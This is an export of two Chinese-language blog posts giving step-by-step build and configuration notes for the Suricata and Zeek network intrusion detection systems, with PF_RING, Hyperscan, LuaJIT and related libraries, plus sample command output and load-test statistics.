    <url>/2019/10/14/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90%20-%20Suricata%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="PF-RING"><a href="#PF-RING" class="headerlink" title="PF_RING"></a>PF_RING</h2><p><strong>1. pf_ring</strong></p>
<ul>
<li> <strong>二进制安装</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 18.04 LTS</span></span><br><span class="line">$ apt-get install software-properties-common wget</span><br><span class="line">$ add-apt-repository universe [ unless you have <span class="keyword">done</span> it previously ]</span><br><span class="line">$ wget http://apt-stable.ntop.org/18.04/all/apt-ntop-stable.deb</span><br><span class="line">$ apt install ./apt-ntop-stable.deb</span><br><span class="line"></span><br><span class="line">$ apt-get clean all</span><br><span class="line">$ apt-get update</span><br><span class="line">$ apt-get install pfring</span><br></pre></td></tr></table></figure>

<hr>
<ul>
<li><strong>编译安装</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 依赖</span></span><br><span class="line">$ apt install git make gcc libelf-dev build-essential subversion flex libnuma-dev bison pkg-config libtool rustc cargo libjansson-dev ethtool autoconf autogen liblzma-dev libpcre3-dev libyaml-dev libpcap-dev zlib1g-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/ntop/PF_RING.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">$ <span class="built_in">cd</span> PF_RING/kernel</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载 pf_ring.ko</span></span><br><span class="line">$ sudo insmod pf_ring.ko min_num_slots=65536 transparent_mode=2 enable_tx_capture=0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 pf_ring 信息</span></span><br><span class="line">$ cat /proc/net/pf_ring/info</span><br><span class="line">PF_RING Version          : 7.5.0 (dev:14f62e0edb2b54cd614ab9d1f6467ccb8c6c9c32)</span><br><span class="line">Total rings              : 0</span><br><span class="line"></span><br><span class="line">Standard (non ZC) Options</span><br><span class="line">Ring slots               : 65536</span><br><span class="line">Slot version             : 17</span><br><span class="line">Capture TX               : No [RX only]</span><br><span class="line">IP Defragment            : No</span><br><span class="line">Socket Mode              : Standard</span><br><span class="line">Cluster Fragment Queue   : 0</span><br><span class="line">Cluster Fragment Discard : 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载 pf_ring.ko</span></span><br><span class="line">$ sudo rmmod pf_ring</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>2. libpfring、libpcap</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> PF_RING/userland/lib</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure &amp;&amp; make</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ../libpcap</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure &amp;&amp; make</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> PF_RING/userland/examples</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 接收数据包</span></span><br><span class="line">root@ubuntu:/opt/PF_RING/userland/examples# ./pfcount -i ens33</span><br><span class="line">Using PF_RING v.7.5.0</span><br><span class="line">Capturing from ens33 [mac: 00:0C:29:D5:B9:8F][if_index: 2][speed: 0Mb/s]</span><br><span class="line"><span class="meta">#</span><span class="bash"> Device RX channels: 1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Polling threads:    1</span></span><br><span class="line">Dumping statistics on /proc/net/pf_ring/stats/51441-ens33.3</span><br><span class="line">=========================</span><br><span class="line">Absolute Stats: [2 pkts total][0 pkts dropped][0.0% dropped]</span><br><span class="line">[2 pkts rcvd][424 bytes rcvd]</span><br><span class="line">=========================</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 发送数据包</span></span><br><span class="line">root@ubuntu:/opt/PF_RING/userland/examples# sudo ./pfsend -f 64byte_packets.pcap -n 0 -i ens33 -r 5</span><br><span class="line">Sending packets on ens33</span><br><span class="line">Using PF_RING v.7.5.0</span><br><span class="line">Estimated CPU freq: 2429795000 Hz</span><br><span class="line">Unable to open file 64byte_packets.pcap</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>3. tcpdump</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">$ <span class="built_in">cd</span> PF_RING/userland/tcpdump/</span><br><span class="line">$ ./configure &amp;&amp; make</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>参考:</strong></p>
<ul>
<li><p><strong><a href="https://www.ntop.org/guides/pf_ring/get_started/git_installation.html">PF_RING</a></strong></p>
</li>
<li><p><a href="http://packages.ntop.org/apt-stable/">http://packages.ntop.org/apt-stable/</a></p>
</li>
<li><p><a href="https://www.ntop.org/guides/pf_ring/get_started/packages_installation.html">https://www.ntop.org/guides/pf_ring/get_started/packages_installation.html</a></p>
</li>
<li><p><a href="https://www.ntop.org/guides/pf_ring/thirdparty/suricata.html">https://www.ntop.org/guides/pf_ring/thirdparty/suricata.html</a></p>
</li>
</ul>
<h2 id="LuaJIT"><a href="#LuaJIT" class="headerlink" title="LuaJIT"></a>LuaJIT</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> wget http://luajit.org/download/LuaJIT-2.0.5.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar -zxf LuaJIT-2.0.5.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> LuaJIT-2.0.5/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make &amp;&amp; make install</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ldconfig</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ldconfig -p | grep lua</span></span><br><span class="line">	liblua5.1.so.0 (libc6,x86-64) =&gt; /usr/lib/x86_64-linux-gnu/liblua5.1.so.0</span><br><span class="line">	liblua5.1.so (libc6,x86-64) =&gt; /usr/lib/x86_64-linux-gnu/liblua5.1.so</span><br><span class="line">	liblua5.1-c++.so.0 (libc6,x86-64) =&gt; /usr/lib/x86_64-linux-gnu/liblua5.1-c++.so.0</span><br><span class="line">	liblua5.1-c++.so (libc6,x86-64) =&gt; /usr/lib/x86_64-linux-gnu/liblua5.1-c++.so</span><br></pre></td></tr></table></figure>



<h2 id="Hyperscan"><a href="#Hyperscan" class="headerlink" title="Hyperscan"></a>Hyperscan</h2><p><strong>1. boost</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 依赖</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> apt install cmake</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> wget https://dl.bintray.com/boostorg/release/1.69.0/<span class="built_in">source</span>/boost_1_69_0.tar.gz</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar -xvf boost_1_69_0.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> boost_1_69_0/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./bootstrap.sh</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ./b2 --with-iostreams --with-random install</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ldconfig</span></span><br></pre></td></tr></table></figure>

<p><strong>2. ragle</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 依赖</span></span><br><span class="line">$ sudo apt-get install autoconf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line">$ wget http://www.colm.net/files/ragel/ragel-6.10.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">$ tar zxvf ragel-6.10.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> ragel-6.10</span><br><span class="line">$ ./configure</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line">$ ldconfig</span><br></pre></td></tr></table></figure>

<p><strong>3. hyperscan</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 依赖</span></span><br><span class="line">$ sudo apt install libpcap-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line">$ wget https://github.com/intel/hyperscan/archive/v5.1.0.tar.gz -O hyperscan-5.1.0.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">$ tar -zxvf hyperscan-5.1.0.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> hyperscan-5.1.0</span><br><span class="line">$ mkdir cmake-build</span><br><span class="line">$ <span class="built_in">cd</span> cmake-build</span><br><span class="line">$ cmake -DBUILD_SHARED_LIBS=on -DCMAKE_BUILD_TYPE=Release ..</span><br><span class="line">$ make -j8</span><br><span class="line">$ sudo make install</span><br><span class="line">$ ldconfig</span><br></pre></td></tr></table></figure>

<p><strong>4. 验证</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ldconfig -p | grep hs</span></span><br><span class="line">	libhs_runtime.so.5 (libc6,x86-64) =&gt; /usr/local/lib/libhs_runtime.so.5</span><br><span class="line">	libhs_runtime.so (libc6,x86-64) =&gt; /usr/local/lib/libhs_runtime.so</span><br><span class="line">	libhs.so.5 (libc6,x86-64) =&gt; /usr/local/lib/libhs.so.5</span><br><span class="line">	libhs.so (libc6,x86-64) =&gt; /usr/local/lib/libhs.so</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>参考:</strong></p>
<ul>
<li><a href="http://www.manongjc.com/article/110977.html"><strong>Hyperscan - 5.1.0 安装</strong></a></li>
</ul>
<h2 id="Suricata"><a href="#Suricata" class="headerlink" title="Suricata"></a><strong>Suricata</strong></h2><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt-get install libpcre3 libpcre3-dbg libpcre3-dev build-essential libpcap-dev   \</span></span><br><span class="line"><span class="bash">                libnet1-dev libyaml-0-2 libyaml-dev pkg-config zlib1g zlib1g-dev \</span></span><br><span class="line"><span class="bash">                libcap-ng-dev libcap-ng0 make libmagic-dev libjansson-dev        \</span></span><br><span class="line"><span class="bash">                libnss3-dev libgeoip-dev libhiredis-dev libevent-dev \</span></span><br><span class="line"><span class="bash">                python-yaml rustc cargo libmaxminddb-dev liblzma-dev \</span></span><br><span class="line"><span class="bash">                python3-distutils liblz4-dev</span></span><br></pre></td></tr></table></figure>

<h3 id="安装方式-2选1"><a href="#安装方式-2选1" class="headerlink" title="安装方式: 2选1"></a>安装方式: 2选1</h3><h4 id="release"><a href="#release" class="headerlink" title="release"></a>release</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget https://www.openinfosecfoundation.org/download/suricata-5.0.2.tar.gz</span><br><span class="line">$ tar zxvf suricata-5.0.2.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> suricata</span><br><span class="line">$ ./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var --enable-pfring --with-libpfring-includes=/usr/<span class="built_in">local</span>/include --with-libpfring-libraries=/usr/<span class="built_in">local</span>/lib --enable-geoip  --enable-luajit --with-libluajit-includes=/usr/<span class="built_in">local</span>/include/luajit-2.0/ --with-libluajit-libraries=/usr/<span class="built_in">local</span>/lib/ --with-libhs-includes=/usr/<span class="built_in">local</span>/include/hs/ --with-libhs-libraries=/usr/<span class="built_in">local</span>/lib/</span><br><span class="line">$ make &amp;&amp; make install-full</span><br><span class="line">$ ldconfig</span><br></pre></td></tr></table></figure>

<h4 id="git-clone"><a href="#git-clone" class="headerlink" title="git clone"></a>git clone</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir suricata</span><br><span class="line">$ <span class="built_in">cd</span> suricata</span><br><span class="line">$ git <span class="built_in">clone</span> git://phalanx.openinfosecfoundation.org/oisf.git</span><br><span class="line">$ <span class="built_in">cd</span> oisf</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/OISF/libhtp.git</span><br><span class="line">$ ./autogen.sh</span><br><span class="line">$ ./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var --enable-pfring --with-libpfring-includes=/usr/<span class="built_in">local</span>/include --with-libpfring-libraries=/usr/<span class="built_in">local</span>/lib --enable-geoip  --enable-luajit --with-libluajit-includes=/usr/<span class="built_in">local</span>/include/luajit-2.0/ --with-libluajit-libraries=/usr/<span class="built_in">local</span>/lib/ --with-libhs-includes=/usr/<span class="built_in">local</span>/include/hs/ --with-libhs-libraries=/usr/<span class="built_in">local</span>/lib/</span><br><span class="line">$ make &amp;&amp; make install-full</span><br><span class="line">$ ldconfig</span><br></pre></td></tr></table></figure>





<h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p><strong>1. PF_RING</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> suricata --build-info | grep PF_RING</span></span><br><span class="line">Features: PCAP_SET_BUFF PF_RING AF_PACKET HAVE_PACKET_FANOUT LIBCAP_NG LIBNET1.1 HAVE_HTP_URI_NORMALIZE_HOOK PCRE_JIT HAVE_NSS HAVE_LUA HAVE_LUAJIT HAVE_LIBJANSSON PROFILING TLS MAGIC RUST</span><br><span class="line">  PF_RING support:                         yes</span><br></pre></td></tr></table></figure>

<p><strong>2. LuaJit</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> suricata --build-info | grep lua</span></span><br><span class="line">  LUA support:                             yes, through luajit</span><br><span class="line">  libluajit:                               yes</span><br></pre></td></tr></table></figure>

<p><strong>3. Hyperscan</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> suricata --build-info | grep Hyperscan</span></span><br><span class="line">  Hyperscan support:                       yes</span><br></pre></td></tr></table></figure>



<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a><strong>启动</strong></h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> suricata --pfring-int=ens6 --pfring-cluster-id=99 --pfring-cluster-type=cluster_flow -c /etc/suricata/suricata.yaml</span></span><br></pre></td></tr></table></figure>



<h1 id="规则管理"><a href="#规则管理" class="headerlink" title="规则管理"></a>规则管理</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pip install --upgrade suricata-update</span><br></pre></td></tr></table></figure>

<p><strong>定时更新</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> crontab -l</span></span><br><span class="line">10 0 * * * /usr/bin/suricata-update --no-test &amp;&amp; /usr/bin/suricatasc -c reload-rules</span><br></pre></td></tr></table></figure>



<h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><p><a href="https://www.jianshu.com/p/9348e211a6a2">https://www.jianshu.com/p/9348e211a6a2</a></p>
]]></content>
      <categories>
        <category>NIDS</category>
      </categories>
      <tags>
        <tag>Suricata</tag>
      </tags>
  </entry>
  <entry>
    <title>我在&#39;云&#39;上的日子 - Zeek(部署)</title>
    <url>/2019/10/14/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90%20-%20Zeek%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<h4 id="Optional-Dependencies"><a href="#Optional-Dependencies" class="headerlink" title="Optional Dependencies"></a>Optional Dependencies</h4><h5 id="PF-RING"><a href="#PF-RING" class="headerlink" title="PF_RING"></a>PF_RING</h5><p><strong>参考:</strong></p>
<ul>
<li><strong><a href="https://docs.zeek.org/en/v3.1.1/configuration/index.html#pf-ring-cluster-configuration">Installing PF_RING</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo git <span class="built_in">clone</span> https://github.com/ntop/PF_RING.git</span><br><span class="line">$ <span class="built_in">cd</span> PF_RING/userland/lib</span><br><span class="line">$ ./configure</span><br><span class="line">$ sudo make install</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> ../libpcap</span><br><span class="line">$ ./configure</span><br><span class="line">$ sudo make install</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> ../tcpdump</span><br><span class="line">$ ./configure</span><br><span class="line">$ sudo make install</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> ../../kernel</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line"></span><br><span class="line">$ modprobe pf_ring enable_tx_capture=0 min_num_slots=65536</span><br></pre></td></tr></table></figure>

<p><em><strong>Load pf_ring at boot</strong></em></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;pf_ring&#x27;</span> &gt;&gt; /etc/modules</span><br><span class="line">$ sudo reboot</span><br><span class="line"></span><br><span class="line">root@ubuntu:~<span class="comment"># lsmod | grep pf_ring</span></span><br><span class="line">pf_ring              1245184  0</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="GeoLocation"><a href="#GeoLocation" class="headerlink" title="GeoLocation"></a>GeoLocation</h5><p><strong>参考:</strong></p>
<ul>
<li><strong><a href="https://docs.zeek.org/en/stable/frameworks/geoip.html#geolocation">Installing LibgeoIP</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install libmaxminddb-dev</span><br><span class="line">$ wget http://geolite.maxmind.com/download/geoip/database/GeoLite2-City.tar.gz</span><br><span class="line">$ tar zxf GeoLite2-City.tar.gz</span><br><span class="line">$ mkdir -p /usr/share/GeoIP</span><br><span class="line">$ mv GeoLite2-City_20190702/GeoLite2-City.mmdb /usr/share/GeoIP/</span><br></pre></td></tr></table></figure>

<p><strong>Testing</strong></p>
<p><em>如果未找到任何内容或未设置<code>mmdb_dir</code>，则<code>Zeek</code>按以下顺序查找位置数据库文件：</em></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ zeek -e <span class="string">&quot;print lookup_location(8.8.8.8);&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>/usr/share/GeoIP/GeoLite2-City.mmdb</li>
<li>/var/lib/GeoIP/GeoLite2-City.mmdb</li>
<li>/usr/local/share/GeoIP/GeoLite2-City.mmdb</li>
<li>/usr/local/var/GeoIP/GeoLite2-City.mmdb</li>
<li>/usr/share/GeoIP/GeoLite2-Country.mmdb</li>
<li>/var/lib/GeoIP/GeoLite2-Country.mmdb</li>
<li>/usr/local/share/GeoIP/GeoLite2-Country.mmdb</li>
<li>/usr/local/var/GeoIP/GeoLite2-Country.mmdb</li>
</ul>
<p><em>如果出现 “Zeek was not configured for GeoIP support”, 源码安装时需要指定<code>./configure --with-geoip=/usr/share/GeoIP</code></em></p>
<hr>
<h5 id="Gperftools"><a href="#Gperftools" class="headerlink" title="Gperftools"></a>Gperftools</h5><p><strong>参考:</strong></p>
<ul>
<li><strong><a href="http://pkxpp.github.io/2017/03/30/gperftools%E5%AE%89%E8%A3%85/">Installing Gperftools</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo git <span class="built_in">clone</span> https://github.com/gperftools/gperftools.git</span><br><span class="line">$ sudo apt-get install libunwind-dev autoconf automake libtool</span><br><span class="line">$ ./autogen.sh</span><br><span class="line">$ ./configure</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="IPsumdump"><a href="#IPsumdump" class="headerlink" title="IPsumdump"></a>IPsumdump</h5><p><strong>参考:</strong></p>
<ul>
<li><a href="http://www.read.seas.harvard.edu/~kohler/ipsumdump/"><strong>Installing IPsumdump</strong></a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -O http://www.read.seas.harvard.edu/~kohler/ipsumdump/ipsumdump-1.86.tar.gz</span><br><span class="line">$ tar -xzf ipsumdump-1.86.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> ipsumdump-1.86</span><br><span class="line">$ ./configure --prefix=/usr/</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line">$ sudo make clean</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="Krb5"><a href="#Krb5" class="headerlink" title="Krb5"></a>Krb5</h5><p><strong>参考:</strong></p>
<ul>
<li><strong><a href="http://computing.help.inf.ed.ac.uk/kerberos-ubuntu">Installing Krb5</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install krb5-user</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="Jemalloc"><a href="#Jemalloc" class="headerlink" title="Jemalloc"></a>Jemalloc</h5><p><strong>参考:</strong></p>
<ul>
<li><a href="https://blog.csdn.net/u013224233/article/details/87930772"><strong>Installing Jemalloc</strong></a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo git <span class="built_in">clone</span> https://github.com/jemalloc/jemalloc.git</span><br><span class="line">$ ./autogen.sh</span><br><span class="line">$ make -j2</span><br><span class="line">$ sudo make install</span><br><span class="line">$ sudo ldconfig</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="Zeek"><a href="#Zeek" class="headerlink" title="Zeek"></a>Zeek</h4><p><strong>Required Dependencies</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Ubuntu</span></span><br><span class="line">$ sudo apt-get install cmake make gcc g++ flex bison libpcap-dev libssl-dev python-dev swig zlib1g-dev</span><br></pre></td></tr></table></figure>

<p><em>If your system uses Python 2.7, then you will also need to install the <code>python-ipaddres</code> package.</em></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install python-ipaddress</span><br></pre></td></tr></table></figure>

<p><strong>参考:</strong></p>
<ul>
<li><strong><a href="https://docs.zeek.org/en/stable/install/install.html">Installing Zeek</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --recursive https://github.com/zeek/zeek</span><br><span class="line"><span class="comment"># Enable zeekjs</span></span><br><span class="line">$ ./configure --with-pcap=/usr/<span class="built_in">local</span> --with-geoip=/usr/share/GeoIP --enable-jemalloc --enable-perftools -D NODEJS_ROOT_DIR:string=/opt/node-19 </span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure>

<p><em><strong>确保<code>Zeek</code>正确链接到所需的<code>libpcap</code>库:</strong></em></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ldd /usr/<span class="built_in">local</span>/zeek/bin/zeek | grep pcap</span><br><span class="line">	libpcap.so.1 =&gt; /usr/<span class="built_in">local</span>/lib/libpcap.so.1 (0x00007fd5b3cfc000)</span><br></pre></td></tr></table></figure>

<h5 id="Add-PATH"><a href="#Add-PATH" class="headerlink" title="Add PATH"></a><strong>Add PATH</strong></h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">export</span> PATH=/usr/<span class="built_in">local</span>/zeek/bin:<span class="variable">$PATH</span></span><br><span class="line">$ <span class="built_in">source</span> ~/.bashrc</span><br><span class="line"></span><br><span class="line">$ sudo vim ~/.bashrc</span><br><span class="line"><span class="built_in">export</span> PATH=/usr/<span class="built_in">local</span>/zeek/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<hr>
<h5 id="Using-PF-RING"><a href="#Using-PF-RING" class="headerlink" title="Using PF_RING"></a><strong>Using PF_RING</strong></h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim /usr/<span class="built_in">local</span>/zeek/etc/node.cfg</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example ZeekControl node configuration.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This example has a standalone node ready to go except for possibly changing</span></span><br><span class="line"><span class="comment"># the sniffing interface.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This is a complete standalone configuration.  Most likely you will</span></span><br><span class="line"><span class="comment"># only need to change the interface.</span></span><br><span class="line"><span class="comment"># [zeek]</span></span><br><span class="line"><span class="comment"># type=standalone</span></span><br><span class="line"><span class="comment"># host=localhost</span></span><br><span class="line"><span class="comment"># interface=ens33</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Below is an example clustered configuration. If you use this,</span></span><br><span class="line"><span class="comment">## remove the [zeek] node above.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[logger]</span></span><br><span class="line"><span class="comment">#type=logger</span></span><br><span class="line"><span class="comment">#host=localhost</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[manager]</span><br><span class="line"><span class="built_in">type</span>=manager</span><br><span class="line">host=localhost</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[proxy-1]</span><br><span class="line"><span class="built_in">type</span>=proxy</span><br><span class="line">host=localhost</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[worker-1]</span><br><span class="line"><span class="built_in">type</span>=worker</span><br><span class="line">host=localhost</span><br><span class="line">interface=ens33</span><br><span class="line">lb_method=pf_ring</span><br><span class="line">lb_procs=35</span><br><span class="line">pin_cpus=0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#[worker-2]</span></span><br><span class="line"><span class="comment">#type=worker</span></span><br><span class="line"><span class="comment">#host=localhost</span></span><br><span class="line"><span class="comment">#interface=eth0</span></span><br></pre></td></tr></table></figure>

<h5 id="Enable-Json"><a href="#Enable-Json" class="headerlink" title="Enable Json"></a>Enable Json</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim /usr/<span class="built_in">local</span>/zeek/share/zeek/site/local.zeek</span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment the following line to enable logging of link-layer addresses. Enabling</span></span><br><span class="line"><span class="comment"># this adds the link-layer address for each connection endpoint to the conn.log file.</span></span><br><span class="line"><span class="comment"># @load policy/protocols/conn/mac-logging</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">@load policy/tuning/json-logs.zeek</span><br></pre></td></tr></table></figure>



<h4 id="压测"><a href="#压测" class="headerlink" title="压测"></a>压测</h4><ol>
<li><h5 id="查看是否丢包"><a href="#查看是否丢包" class="headerlink" title="查看是否丢包"></a><strong>查看是否丢包</strong></h5></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ zeekctl netstats; date</span><br><span class="line"> worker-1-1: 1585999488.317958 recvd=18 dropped=0 link=18</span><br><span class="line"> worker-1-2: 1585999488.335990 recvd=0 dropped=0 link=0</span><br><span class="line"> worker-1-3: 1585999488.345568 recvd=2 dropped=0 link=2</span><br><span class="line">Sat Apr  4 04:24:48 PDT 2020</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><h5 id="查看资源占用"><a href="#查看资源占用" class="headerlink" title="查看资源占用"></a><strong>查看资源占用</strong></h5></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ zeekctl top; date</span><br><span class="line">Name         Type    Host             Pid     VSize  Rss  Cpu   Cmd</span><br><span class="line">manager      manager localhost        4818      1G    87M   0%  zeek</span><br><span class="line">proxy-1      proxy   localhost        4870    649M    85M   0%  zeek</span><br><span class="line">worker-1-1   worker  localhost        4948    655M    92M   0%  zeek</span><br><span class="line">worker-1-2   worker  localhost        4952    655M    92M   0%  zeek</span><br><span class="line">worker-1-3   worker  localhost        4954    655M    92M   0%  zeek</span><br><span class="line">Sat Apr  4 04:24:52 PDT 2020</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><h5 id="查看流量大小-10秒"><a href="#查看流量大小-10秒" class="headerlink" title="查看流量大小(10秒)"></a><strong>查看流量大小(10秒)</strong></h5></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ zeekctl capstats; date</span><br><span class="line">Interface             kpps       mbps       (10s average)</span><br><span class="line">----------------------------------------</span><br><span class="line">localhost/ens5        37.8       375.2</span><br><span class="line">Fri Aug 16 16:12:47 UTC 2019</span><br></pre></td></tr></table></figure>



<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
